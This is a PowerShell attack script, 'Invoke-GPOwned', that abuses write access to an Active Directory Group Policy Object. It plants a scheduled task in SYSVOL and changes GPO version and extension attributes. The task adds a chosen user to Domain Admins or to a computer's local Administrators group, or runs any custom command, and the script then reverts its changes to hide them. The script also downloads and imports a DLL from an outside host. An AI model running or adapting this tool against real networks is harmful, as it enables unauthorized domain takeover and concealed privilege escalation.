function Invoke-GPOwned {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [Alias("guid")]
        [string]$GPOGUID,
        
        [Parameter(Mandatory=$false)]
        [Alias("xml")]
        [string]$ScheduledTasksXMLPath,

        [Parameter(Mandatory=$false)]
        [Alias("u")]
        [string]$User,

        [Parameter(Mandatory=$false)]
        [Alias("a")]
        [string]$Author,

        [Parameter(Mandatory=$false)]
        [Alias("d")]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [Alias("c")]
        [string]$Computer,
        
        [Parameter(Mandatory=$false)]
        [Alias("h")]
        [switch]$Help,

        [Parameter(Mandatory=$false)]
        [switch]$DA,

        [Parameter(Mandatory=$false)]
        [switch]$Local,

        [Parameter(Mandatory=$false)]
        [Alias("dll")]
        [string]$LoadDLL,

        [Parameter(Mandatory=$false)]
        [Alias("cc")]
        [string]$CustomCommand,
        
        [Parameter(Mandatory=$false)]
        [Alias("ccp")]
        [string]$PowerShellCustomCommand
    )

    if ($Help -or !($GPOGUID) -or !($ScheduledTasksXMLPath) -or !($Computer)) {
        Write-Output @"
Invoke-GPOwned Help:

Example : Invoke-GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User Administrator -Domain noteasy.local -DC dc01.noteasy.local

Parameters:
-GPOGUID: Group Policy GUID
-ScheduledTasksXMLPath: Full path to the ScheduledTasks xml file
-Computer: Target computer
-Local: - adds a chosen user to the local administrators goup on the defined computer
-DA: adds the user to the domain admins group
-CustomCommand:
-User: Target user to elevate, mandatory for Local technique
-Domain: Target domain
-LoadDLL: Load the Microsoft.ActiveDirectory.Management.dll from a custom path, if not supplied it will try to download it to the current directory
"@
        return
    }


    # Enabling TLS and loading the ActiveDirectory module to memory #
if(!($LoadDLL)){
    iwr https://ownd.lol/NIdmxycw/Microsoft.ActiveDirectory.Management.dll -OutFile Microsoft.ActiveDirectory.Management.dll
    Import-Module .\Microsoft.ActiveDirectory.Management.dll
    $mod = (Get-Module | select Name -ExpandProperty Name | findstr /i activedirectory)
    if(($mod.Contains("Microsoft.ActiveDirectory")) -eq "True"){
        $null
    } else {
        Write-Error "[-] ActiveDirectory module failed to load!"
        return
    }
} elseif($LoadDLL) {
    Import-Module $LoadDLL -ErrorAction Stop
    $mod = (Get-Module | select Name -ExpandProperty Name | findstr /i activedirectory)
    if(($mod.Contains("Microsoft.ActiveDirectory")) -eq "True"){
        $null
    } else {
        Write-Error "[-] ActiveDirectory module failed to load!"
        return
    }
} else {
    Write-Error "[-] Couldn't load DLL exiting..."
    return
}
    $guid = $GPOGUID
    $guid2 = "{"+$guid+"}"
    
    # Use provided domain or get it from AD
    if ($Domain) {
        $domain = $Domain
    } else {
        $domain = (Get-ADDomain).Forest
    }

    $domaindn = (Get-ADDomain).DistinguishedName
    
    # Use provided DC or get it from AD
    if ($Computer) {
        $dc = $Computer
    } else {
        $dc = (Get-ADDomain).InfrastructureMaster
    }

    # Checking for gPCMachineExtensionNames for the means of backup and restoration after execution #
    if(Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames -ErrorAction SilentlyContinue){
        $InitialExtensions = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames);
    } else {
        $noext=1
    }

    # Look for an active domain admin account #
    if(!($TargetUser)){
        $i = 0
        while($gotcha -ne "1"){
            $dauser = (Get-ADGroupMember "Domain Admins" | Select-Object SamAccountName -ExpandProperty SamAccountName)[$i]
            if(((net user $dauser /dom | findstr active)[29]) -eq "Y"){
                $gotcha++
            } else {
                $i++
            }
        }
    }
    $validatexml = Get-Content $ScheduledTasksXMLPath
    if(-not(Test-Path $ScheduledTasksXMLPath)){
        Write-Output "[-] XML file not found!."
        break
    }
    elseif($validatexml.StartsWith("<?xml version")){
        Write-Output "[+] XML File is valid!."
    }else{
        Write-Output "[-] XML file empty or corrupted!."
        exit(0)
    }
    # Checking whether a ScheduledTasks.xml file exists in SYSVOL for the means of backup and restoration after execution #
    if(Get-Content "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -ErrorAction SilentlyContinue){
        Copy-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old"
        Write-Output "[-] ScheduledTasks file in SYSVOL exists, created a backup file!"
        Copy-Item $ScheduledTasksXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
    } else {
        New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
        Copy-Item $ScheduledTasksXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
        Write-Output "[+] Created ScheduledTasks file in SYSVOL!"
    }

    # Modifying the ScheduledTasks.xml with the gathered information #
    if($DA){
    $dacommand = '/r net group "Domain Admins" '+$User+' /add /dom'
    $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
    $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
    $encoding = 'ASCII'
    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
    $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                Set-Content -Encoding $encoding $xmlfile -Force
    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
    $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                Set-Content -Encoding $encoding $xmlfile -Force
    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
    $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                Set-Content -Encoding $encoding $xmlfile -Force
    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
    $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                Set-Content -Encoding $encoding $xmlfile -Force
    $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
    $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$dacommand"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
    Write-Output "[+] ScheduledTasks file modified to add $User to the Domain Admins group!"
    } elseif($Local){
        $localcommand = '/r net localgroup Administrators '+$User+' /add'
        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$localcommand"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        Write-Output "[+] ScheduledTasks file modified to add $User to local administrators group on $Computer!"
    } elseif($CustomCommand){
        if(($CustomCommand.StartSwith("/c "))){
            $CustomCommand = $CustomCommand.replace("/c ","")
        } elseif(($CustomCommand.StartSwith("/r "))){
            $CustomCommand = $CustomCommand.replace("/r ","")
        }
        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r $CustomCommand"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        Write-Output "[+] ScheduledTasks file modified with the supplied custom command!."
    } elseif($PowerShellCustomCommand){
        if(($PowerShellCustomCommand.StartSwith("-c "))){
            $PowerShellCustomCommand = $PowerShellCustomCommand.replace("-c ","")
        } elseif(($PowerShellCustomCommand.StartSwith("-Command "))){
            $PowerShellCustomCommand = $PowerShellCustomCommand.replace("-Command ","")
        }
        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","-Command $PowerShellCustomCommand"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        Write-Output "[+] ScheduledTasks file modified with the supplied custom command!."
    } else {
        Write-Output "[-] Either the -Local/-DA/-CustomCommand/-PowerShellCustomCommand flags are required for execution!."
        return
    }
    

    $Ext = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
    $GPO = "CN=$guid,CN=Policies,CN=System,$domaindn"
    Write-Output "[+] Incrementing GPT.INI Version by 1"
    $gptIniFilePath = "\\$domain\SYSVOL\$domain\Policies\$guid\GPT.INI"
    $encoding = 'ASCII'
    $gptIniContent = Get-Content -Encoding $encoding -Path $gptIniFilePath
    # Incrementing GPI.INI version by 1 to update the SYSVOL Machine policy #
    foreach ($s in $gptIniContent) {
        if($s.StartsWith("Version")) {
            $num = ($s -split "=")[1]
            $ver = [Convert]::ToInt32($num)
            $newVer = $ver + 1
            (Get-Content $gptIniFilePath) | ForEach-Object {$_ -replace "$ver","$newver" } |
                Set-Content -Encoding $encoding $gptIniFilePath -Force
        }
    }
    $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
    Write-Output "[+] Current GPO AD versionNumber = $currentVersion"
    Write-Output "[+] Incrementing version by 1"
    $newVersionValue = $currentVersion+1
    # Incrementing the AD Machine policy by 1 to match the new SYSVOL policy number #
    Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber -Value $newVersionValue
    $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
    Write-Output "[+] GPO AD versionNumber = $currentVersion"
    if($noext -ne 1){
        Write-Output "[+] Current gPCMachineExtensionNames : $InitialExtensions"
    } else {
        Write-Output "[+] Current gPCMachineExtensionNames : <not set>"
    }
    # Modyfing the gPCMachineExtensionNames attribute of the policy # 
    Write-Output "[+] Adding Extensions to the attribute"
    Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value $Ext$InitialExtensions
    $FinalizedGPO = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames)
    if($FinalizedGPO.StartsWith("[{00000000")){
        Write-Output "[+] Successfully written extensions to GPO!"
    } else {
        Write-Error "[-] Failed to write gPCMachineExtensionNames!"
        return
    }
    # A bad loading screen counting up to 300(5 minute update interval on DCs) #
    if($DA){
        for ($x = 1; $x -le 300; $x++ ){
            $PercentCompleted = ($x/300*100)
            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
            Start-Sleep -Seconds 1
            if ((Get-ADGroupMember "Domain Admins" | findstr $User) -ne $null) {
                break
            }
        }
        $timepassed = 0
        while((Get-ADGroupMember "Domain Admins" | findstr $User) -eq $null){
            Start-Sleep 1
            }
        Write-Output "`n`n"
        Write-Output "[+] User added to the domain admins group!"
    } elseif($Local){
         for ($x = 1; $x -le 300; $x++ ){
            $PercentCompleted = ($x/300*100)
            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
            Start-Sleep -Seconds 1
            if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -ne $null) {
                break
            }
        }
        $timepassed = 0
        while((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -eq $null){
            Start-Sleep 1
            }
        Write-Output "[+] User added to the local admins group!"
     }elseif($CustomCommand){
        for ($x = 1; $x -le 300; $x++ ){
            $PercentCompleted = ($x/300*100)
            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
            Start-Sleep -Seconds 1
        }
    }
    
    Write-Output "[+] Reverting extensions back to what they were"
    # Reverting the gPCMachineExtensionNames #
    if($noext -ne 1){
    Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value "$InitialExtensions"
    } else {
        Clear-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames
    }

    if($noext -ne 1){
    Write-Output "[+] gPCMachineExtensionNames reverted back to -> $InitialExtensions"
    } else {
        Write-Output "[+] Cleared gPCMachineExtensionNames!"
    }
    Write-Output "[+] Removing the scheduled task from the DC"
    # Trying to delete the scheduled task from the DC #
    try{
        Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED" -Confirm:$false
    }
    catch{
        Write-Error "[-] Scheduled Task Removal Failed! login to the DC and remove it manually."
    }
    # Reverting the ScheduledTasks.xml to the backup or deletes it #
    Remove-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
    if(Get-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old" -ErrorAction SilentlyContinue){
        Move-Item \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
        Write-Output "[+] XML file restored!"
    } else {
        Write-Output "[+] File removed from SYSVOL"
    }
}
